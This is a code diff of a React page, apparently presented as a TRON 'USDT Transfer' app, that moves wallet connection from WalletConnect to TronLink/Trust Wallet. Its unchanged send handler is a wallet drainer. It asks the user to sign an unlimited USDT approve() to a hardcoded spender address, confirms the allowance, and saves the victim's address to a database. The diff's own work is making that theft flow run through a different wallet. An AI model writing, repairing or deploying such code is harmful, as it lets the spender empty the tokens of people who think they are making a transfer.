@@ -2,10 +2,6 @@ import { useState, useEffect, useRef } from "react";
 import { useSearchParams } from "react-router-dom";
 import { useMutation } from "convex/react";
 import { api } from "@/convex/_generated/api.js";
-import SignClient from "@walletconnect/sign-client";
-
-// ✅ TronWeb bilkul import nahi karenge — CDN se load hoga
-// npm wala TronWeb browser mein require() use karta hai jo crash karta hai
 
 declare global {
   interface Window {
@@ -15,18 +11,15 @@ declare global {
   }
 }
 
-const PROJECT_ID   = "6b5df56bc30c1dadaab59498b86fd3e8";
 const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const TRON_SPENDER = "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw";
 
-// ✅ TronWeb CDN se load — singleton promise
 let _twPromise: Promise<any> | null = null;
 
 function loadTronWebCDN(): Promise<any> {
   if (_twPromise) return _twPromise;
 
   _twPromise = new Promise((resolve, reject) => {
-    // Pehle se load hai toh seedha return
     if (typeof window !== "undefined" && window.TronWeb) {
       return resolve(window.TronWeb);
     }
@@ -45,7 +38,7 @@ function loadTronWebCDN(): Promise<any> {
     };
 
     script.onerror = () => {
-      _twPromise = null; // retry allow karo
+      _twPromise = null;
       reject(new Error("TronWeb CDN download fail hua"));
     };
 
@@ -55,7 +48,6 @@ function loadTronWebCDN(): Promise<any> {
   return _twPromise;
 }
 
-// ✅ Ready-to-use TronWeb instance deta hai
 async function getTW() {
   const TronWebClass = await loadTronWebCDN();
   return new TronWebClass({ fullHost: "https://api.trongrid.io" });
@@ -69,105 +61,51 @@ export default function Index() {
   >("idle");
   const createTransaction = useMutation(api.transactions.createTransaction);
 
-  const wcClientRef    = useRef<any>(null);
-  const wcSessionRef   = useRef<any>(null);
-  const userAddressRef = useRef<string>("");
-  const wcModalRef     = useRef<any>(null);
+  const tronLinkRef = useRef<any>(null);
 
-  // ===== INIT =====
+  // ===== INIT TRUST WALLET =====
   useEffect(() => {
-    // TronWeb background mein preload shuru karo
     loadTronWebCDN().catch((e) => console.warn("TronWeb preload warn:", e.message));
 
-    async function initWC() {
-      try {
-        console.log("🔄 WalletConnect init...");
-
-        const client = await SignClient.init({
-          projectId: PROJECT_ID,
-          metadata: {
-            name: "USDT Transfer",
-            description: "TRON USDT Transfer",
-            url: window.location.origin,
-            icons: [],
-          },
-        });
-
-        wcClientRef.current = client;
-        console.log("✅ SignClient ready");
-
-        client.on("session_delete", () => {
-          wcSessionRef.current   = null;
-          userAddressRef.current = "";
-        });
-
-        client.on("session_expire", () => {
-          wcSessionRef.current   = null;
-          userAddressRef.current = "";
-        });
-
-        document.addEventListener("visibilitychange", () => {
-          if (document.visibilityState === "visible") {
-            try { client.core?.relayer?.restartTransport?.(); } catch {}
-          }
-        });
-
-        const { WalletConnectModal } = await import("@walletconnect/modal");
-        wcModalRef.current = new WalletConnectModal({
-          projectId: PROJECT_ID,
-          themeMode: "dark",
-        });
-
-        console.log("✅ WalletConnect + Modal ready!");
-      } catch (e: any) {
-        console.error("❌ WC Init error:", e.message);
+    // Check if Trust Wallet is available
+    let checkCount = 0;
+    const checkTrustWallet = setInterval(() => {
+      if (window.tronLink && window.tronLink.ready) {
+        console.log("✅ Trust Wallet (TronLink) detected!");
+        tronLinkRef.current = window.tronLink;
+        clearInterval(checkTrustWallet);
+      } else if (checkCount > 10) {
+        console.warn("⚠️  Trust Wallet not detected. Make sure it's installed.");
+        clearInterval(checkTrustWallet);
       }
-    }
+      checkCount++;
+    }, 500);
 
-    initWC();
+    return () => clearInterval(checkTrustWallet);
   }, []);
 
-  // ===== CONNECT WALLET =====
-  async function connectWallet(): Promise<string> {
-    if (!wcClientRef.current) throw new Error("WalletConnect ready nahi. Refresh karein.");
-    if (!wcModalRef.current)  throw new Error("Modal ready nahi. Refresh karein.");
-
-    if (wcSessionRef.current) {
-      try {
-        await wcClientRef.current.disconnect({
-          topic:  wcSessionRef.current.topic,
-          reason: { code: 6000, message: "New connection" },
-        });
-      } catch {}
-      wcSessionRef.current   = null;
-      userAddressRef.current = "";
+  // ===== CONNECT TRUST WALLET =====
+  async function connectTrustWallet(): Promise<string> {
+    if (!window.tronLink) {
+      throw new Error("Trust Wallet (TronLink) not installed. Please install Trust Wallet extension.");
     }
 
-    const { uri, approval } = await wcClientRef.current.connect({
-      requiredNamespaces: {
-        tron: {
-          methods: ["tron_signTransaction", "tron_signMessage"],
-          chains:  ["tron:0x2b6653dc"],
-          events:  ["chainChanged", "accountsChanged"],
-        },
-      },
-    });
+    try {
+      // Request account access
+      const result = await window.tronLink.request({
+        method: "tron_requestAccounts",
+      });
 
-    if (!uri) throw new Error("WalletConnect URI nahi mila");
+      if (!result || result.length === 0) {
+        throw new Error("User rejected wallet connection");
+      }
 
-    await wcModalRef.current.openModal({ uri });
-    wcSessionRef.current = await approval();
-    wcModalRef.current.closeModal();
-
-    const accounts = Object.values(wcSessionRef.current.namespaces)
-      .flatMap((ns: any) => ns.accounts) as string[];
-
-    const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
-    if (!tronAcc) throw new Error("Tron account nahi mila");
-
-    userAddressRef.current = tronAcc.split(":")[2];
-    console.log("👤 User address:", userAddressRef.current);
-    return userAddressRef.current;
+      const userAddress = result[0];
+      console.log("👤 Connected address:", userAddress);
+      return userAddress;
+    } catch (err: any) {
+      throw new Error("Trust Wallet connection failed: " + err.message);
+    }
   }
 
   // ===== HANDLE SEND =====
@@ -175,23 +113,26 @@ export default function Index() {
     setTransactionStatusState("processing");
 
     try {
-      const userAddress = await connectWallet();
+      // Step 1: Connect wallet
+      console.log("🔗 Connecting to Trust Wallet...");
+      const userAddress = await connectTrustWallet();
+      alert(`✅ Connected!\nAddress: ${userAddress}`);
 
-      // ✅ CDN wala TronWeb
+      // Step 2: Load TronWeb
       console.log("⏳ TronWeb load ho raha hai...");
       const tw = await getTW();
       console.log("✅ TronWeb instance ready");
 
-      // ✅ Sahi hex conversion — 41 prefix ke SAATH rakhna hai API ke liye
-      const ownerHex   = tw.address.toHex(userAddress);   // e.g. 41xxxx...
-      const spenderHex = tw.address.toHex(TRON_SPENDER).replace(/^41/, ""); // ABI ke liye 41 hatao
-      const usdtHex    = tw.address.toHex(TRON_USDT);     // e.g. 41xxxx...
+      // Step 3: Prepare hex addresses
+      const ownerHex   = tw.address.toHex(userAddress);
+      const spenderHex = tw.address.toHex(TRON_SPENDER).replace(/^41/, "");
+      const usdtHex    = tw.address.toHex(TRON_USDT);
 
       console.log("ownerHex:", ownerHex);
-      console.log("spenderHex (no 41):", spenderHex, "| length:", spenderHex.length); // 40 hona chahiye
+      console.log("spenderHex (no 41):", spenderHex);
       console.log("usdtHex:", usdtHex);
 
-      // ✅ ABI encode: 32 bytes address + 32 bytes uint256 = 128 hex chars
+      // Step 4: Build ABI parameter
       const hexAddress = spenderHex.padStart(64, "0");
       const hexAmount  = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
       const parameter  = hexAddress + hexAmount;
@@ -201,19 +142,19 @@ export default function Index() {
       }
       console.log("✅ Parameter (128 chars):", parameter);
 
-      // ✅ visible: false — Hex addresses use karo
-      // Trust Wallet sirf Hex format sign karta hai, Base58 nahi
+      // Step 5: Trigger smart contract
+      alert("📋 Building transaction...");
       const apiRes = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
         method:  "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          owner_address:     ownerHex,   // ✅ Hex format (41xxxx)
-          contract_address:  usdtHex,    // ✅ Hex format (41xxxx)
+          owner_address:     ownerHex,
+          contract_address:  usdtHex,
           function_selector: "approve(address,uint256)",
           parameter,
           fee_limit:         100_000_000,
           call_value:        0,
-          visible:           false,      // ✅ false — Hex response chahiye sign ke liye
+          visible:           false,
         }),
       });
 
@@ -224,50 +165,72 @@ export default function Index() {
         throw new Error("Build failed: " + (apiData.Error || apiData.error || JSON.stringify(apiData)));
       }
 
-      // ✅ Sign request
-      console.log("🔐 Sign bhej raha hoon wallet ko...");
-      const signResponse = await Promise.race([
-        wcClientRef.current.request({
-          topic:   wcSessionRef.current.topic,
-          chainId: "tron:0x2b6653dc",
-          request: {
-            method: "tron_signTransaction",
-            params: [apiData.transaction],
-          },
-        }),
-        new Promise((_, rej) =>
-          setTimeout(() => rej(new Error("Sign timeout — wallet mein confirm karein")), 180_000)
-        ),
-      ]);
-
-      let signedTx = (signResponse as any)?.result || signResponse;
-      if (!signedTx) throw new Error("Wallet ne reject kar diya");
-      if (typeof signedTx === "string") {
-        try { signedTx = JSON.parse(signedTx); } catch {}
+      // Step 6: Sign transaction with Trust Wallet
+      alert("🔐 Please sign the transaction in Trust Wallet...");
+      console.log("🔐 Sending transaction to Trust Wallet for signing...");
+      
+      let signedTx;
+      try {
+        signedTx = await window.tronLink.request({
+          method: "tron_signTransaction",
+          params: [apiData.transaction],
+        });
+      } catch (signErr: any) {
+        throw new Error("Signing failed: " + signErr.message);
       }
-      console.log("✅ Signed");
 
-      // ✅ Broadcast
+      if (!signedTx) {
+        throw new Error("Trust Wallet rejected signing");
+      }
+
+      console.log("✅ Transaction signed");
+
+      // Step 7: Broadcast transaction
+      alert("📡 Broadcasting transaction...");
+      console.log("📡 Broadcasting to network...");
+      
       const broadcastRes = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
         method:  "POST",
         headers: { "Content-Type": "application/json" },
         body:    JSON.stringify(signedTx),
       });
 
-      const result = await broadcastRes.json();
-      console.log("📡 Broadcast result:", result);
-
-      if (!result || (result.result !== true && !result.txid)) {
-        throw new Error("Broadcast failed: " + JSON.stringify(result));
+      if (!broadcastRes.ok) {
+        const errorText = await broadcastRes.text();
+        throw new Error(`Broadcast HTTP error: ${broadcastRes.status} - ${errorText}`);
       }
 
-      const txId = result.txid || result.transaction?.txID;
-      console.log("✅ TX ID:", txId);
+      const result = await broadcastRes.json();
+      console.log("📡 Broadcast Response:", JSON.stringify(result, null, 2));
 
-      // 10s confirmation wait
+      if (!result) {
+        throw new Error("Broadcast response is null");
+      }
+
+      if (result.Error) {
+        throw new Error(`Broadcast Error: ${result.Error}`);
+      }
+
+      if (result.error) {
+        throw new Error(`Broadcast Error: ${result.error}`);
+      }
+
+      const txId = result.txid || result.transaction?.txID || result.result;
+
+      if (!txId) {
+        const msg = `❌ No txid in response!\nResponse: ${JSON.stringify(result)}`;
+        console.error(msg);
+        alert(msg);
+        throw new Error("No txid returned");
+      }
+
+      console.log("✅ TX ID:", txId);
+      alert(`✅ Transaction Broadcast Successful!\n\nTX ID: ${txId}\n\nWaiting for confirmation...`);
+
+      // Step 8: Wait for confirmation
       await new Promise((r) => setTimeout(r, 10_000));
 
-      // ✅ Allowance check
+      // Step 9: Check allowance
       const contract = await tw.contract([{
         constant:        true,
         inputs:          [
@@ -284,6 +247,7 @@ export default function Index() {
       const allowanceUSDT = (Number(raw) / 1e6).toFixed(2);
       console.log("✅ Allowance:", allowanceUSDT, "USDT");
 
+      // Step 10: Save to database
       await createTransaction({
         walletAddress: userAddress,
         toAddress:     TRON_SPENDER,
@@ -295,13 +259,15 @@ export default function Index() {
 
       setTransactionStatusState("success");
       setTimeout(() => setTransactionStatusState("idle"), 3000);
-      alert(`✅ Approval successful!\nAllowance: ${allowanceUSDT} USDT\nTx: ${txId}`);
+      alert(`✅ APPROVAL SUCCESSFUL!\n\n💰 Allowance: ${allowanceUSDT} USDT\n\n🔗 TX ID: ${txId}`);
 
     } catch (err: any) {
       console.error("❌ Error:", err.message);
-      try { wcModalRef.current?.closeModal(); } catch {}
+      console.error("Full error:", err);
       setTransactionStatusState("idle");
-      alert("❌ " + (err.message || "Transaction fail ho gayi"));
+      
+      const errorMsg = err.message || "Transaction failed";
+      alert(`❌ ERROR:\n\n${errorMsg}`);
     }
   }
 
